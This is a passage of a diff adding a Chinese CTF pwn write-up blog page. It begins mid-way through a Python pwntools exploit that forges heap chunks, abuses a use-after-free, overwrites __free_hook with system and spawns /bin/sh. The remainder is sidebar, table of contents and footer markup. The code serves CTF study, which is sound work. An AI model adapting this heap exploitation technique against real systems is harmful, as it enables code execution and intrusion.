class="comment"># backdoor will free the ptr</span></span><br><span class="line">payload += p64(fakevars_addr+<span class="number">7</span>*<span class="number">8</span>)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += <span class="string">'backdoor'</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># level position</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)<span class="comment">#fake chunk</span></span><br><span class="line">payload += <span class="string">'A'</span>*<span class="number">0x20</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(fakevars_addr)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">comment(<span class="number">0x198</span>,payload)</span><br><span class="line">a.recvuntil(<span class="string">"continue ? \n"</span>)</span><br><span class="line">a.sendline(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getUAF()</span><br><span class="line"></span><br><span class="line">payload = p64(environ_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span>    <span class="comment"># securt[4]</span></span><br><span class="line">payload += p64(fakevars_addr+<span class="number">18</span>*<span class="number">8</span>) <span class="comment">#vars</span></span><br><span class="line">payload += p64(environ_addr)<span class="comment">#string ptr</span></span><br><span class="line">payload += p64(<span class="number">1</span>) <span class="comment">#string length</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment">#padding</span></span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#level</span></span><br><span class="line">payload += p32(<span class="number">2</span>) <span class="comment">#position</span></span><br><span class="line"></span><br><span class="line">comment(<span class="number">0x58</span>,payload)</span><br><span class="line">a.recvuntil(<span class="string">"continue ? \n"</span>)</span><br><span class="line">a.sendline(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">send(<span class="string">"OVER"</span>)</span><br><span class="line"></span><br><span class="line">__free_hook=libc_base+libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">comment(<span class="number">0x28</span>,p64(__free_hook<span class="number">-8</span>))</span><br><span class="line">a.recvuntil(<span class="string">"continue ? \n"</span>)</span><br><span class="line">a.sendline(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">send(<span class="string">"OVER"</span>)</span><br><span class="line">comment(<span class="number">0x28</span>,p64(__free_hook<span class="number">-8</span>))</span><br><span class="line">a.recvuntil(<span class="string">"continue ? \n"</span>)</span><br><span class="line">a.sendline(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">send(<span class="string">"OVER"</span>)</span><br><span class="line">comment(<span class="number">0x28</span>,<span class="string">"/bin/sh\x00"</span>+p64(libc.symbols[<span class="string">"system"</span>]+libc_base))</span><br><span class="line">a.recvuntil(<span class="string">"continue ? \n"</span>)</span><br><span class="line">a.sendline(<span class="string">"NO"</span>)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/25/2019红帽杯final三道pwn的wp/" rel="next" title="2019红帽杯final三道pwn的wp">
+                <i class="fa fa-chevron-left"></i> 2019红帽杯final三道pwn的wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/my.jpg" alt="ditto">
+            
+              <p class="site-author-name" itemprop="name">ditto</p>
+              <p class="site-description motion-element" itemprop="description">pwn for fun</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Dittozzz" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.dongzt.cn/" title="Alkaid" target="_blank">Alkaid</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://nightrainy.github.io/" title="知世" target="_blank">知世</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序分析"><span class="nav-number">1.</span> <span class="nav-text">程序分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#几个类"><span class="nav-number">1.1.</span> <span class="nav-text">几个类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#parser"><span class="nav-number">1.2.</span> <span class="nav-text">parser:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用"><span class="nav-number">2.</span> <span class="nav-text">利用</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ditto</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">61.3k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
